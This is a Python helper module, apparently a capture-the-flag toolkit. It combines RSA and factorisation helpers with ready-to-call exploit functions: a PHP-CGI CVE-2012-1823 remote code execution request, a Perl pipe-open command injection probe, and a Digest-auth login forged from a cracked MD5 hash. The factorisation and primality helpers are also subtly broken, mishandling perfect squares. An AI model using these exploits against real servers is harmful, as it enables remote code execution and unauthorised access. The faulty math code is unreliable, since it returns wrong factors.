import requests
import numpy as np
from PIL import Image
import re
import binascii
import hashlib


def ext_gcd(a, b):
    if b > 0:
        y, x, d = ext_gcd(b, a % b)
        return x, y - a // b * x, d
    else:
        return 1, 0, a


def gcd(a, b):
    if b != 0:
        return gcd(b, a % b)
    else:
        return a


def lcm(a, b):
    return a // gcd(a, b) * b


def is_prime(n):
    i = 2
    while i * i < n:
        if n % i == 0:
            return False
        i += 1
    return True


def pf_decomposition(n):
    """
    practicality factor is 14 digit or less
    10**12 : 0.7sec
    10**13 : 1.3sec
    10**14 : 6.4sec
    """
    i = 2
    factor = []
    while i ** 2 < n:
        e = 0
        while n % i == 0:
            n //= i
            e += 1
        if e > 0:
            factor.append([i, e])
        i += 1
    if n > 0:
        factor.append([n, 1])
    return factor


def generate_rsa_key(e=65537, p=299681192390656691733849646142066664329, q=324144336644773773047359441106332937713):
    key, _, _ = ext_gcd(e, (p-1)*(q-1))
    return int(key % ((p-1)*(q-1)))


def encrypt_rsa(plain, e=65537, n=97139961312384239075080721131188244842051515305572003521287545456189235939577):
    """
    :param plain:
    :param n: public key1
    :param e: public key2
    :return:
    """
    crypto = pow(plain, e, n)
    return crypto


def decrypt_rsa(crypto, d, n=97139961312384239075080721131188244842051515305572003521287545456189235939577):
    """
    :param crypto:
    :param d: secret key
    :param n: public key
    :return:
    """
    dec = pow(crypto, d, n)
    return dec


def exploit_php_cve20121823(url, payload):
    """
    https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html
    :param url:
    :param payload:
    :return:
    """
    exploit = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
    res = requests.post(url+exploit, payload)
    return res


def generate_qr_code(ary, width, height):
    """
    :param ary: [[R, G, B], [R, G, B], [R, G, B]...]
    :param width:
    :param height:
    :return: show QR code image
    """
    nd_ary = np.reshape(ary, (width, height, 3)).astype(np.uint8)
    Image.fromarray(nd_ary).show()


def exploit_perl_direct_os_command(url, payload="exploit_perl_direct_os_command"):
    if payload == "exploit_perl_direct_os_command":
        res1 = requests.get(url + "/echo " + payload + "|")
        res2 = requests.get(url + "/;echo " + payload + "|")
        if payload in res1.text:
            print("exploit1 succeeded")
        if payload in res2.text:
            print("exploit2 succeeded")
    # requests.get(url + "/;" + payload + "|")
    return requests.get(url + "/" + payload + "|")


def resolve_digest_auth(url, user, crackmd5="c627e19450db746b739f41b64097d449"):
    """
    https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC
    :param url:
    :param user:
    :param crackmd5:
    :return:
    """
    uri = re.search("https?://[^/]+(.+)", url).group(1)
    s = requests.session()
    r = s.get(url)
    if r.status_code == 401:
        header_authenticate = r.headers["www-authenticate"]
        realm = re.search(r'realm="(\S+)",', header_authenticate).group(1)
        nonce = re.search(r'nonce="(\S+)",', header_authenticate).group(1)
        algor = re.search(r'algorithm=(\S+),', header_authenticate).group(1)
        qop = re.search(r'qop="(\S+)"', header_authenticate).group(1)

        nc = "00000001"  # random
        cnonce = "9691c249745d94fc"  # random
        base = "GET"+":"+uri
        a2md5 = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()
        base = crackmd5+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+a2md5
        response = binascii.hexlify(hashlib.md5(base.encode("utf-8")).digest()).decode()

        header_authorization = 'Digest ' +\
            'username="' + user +\
            '", realm="' + realm +\
            '", nonce="' + nonce +\
            '", uri="' + uri +\
            '", algorithm=' + algor +\
            ', response="' + response +\
            '", qop=' + qop +\
            ', nc="' + nc +\
            '", cnonce="' + cnonce + '"'

        s.headers.update({'Authorization': header_authorization})
        r = s.get(url)
    return r.text


if __name__ == "__main__": 
    r = pf_decomposition(6542371)
    print(r)
    pass
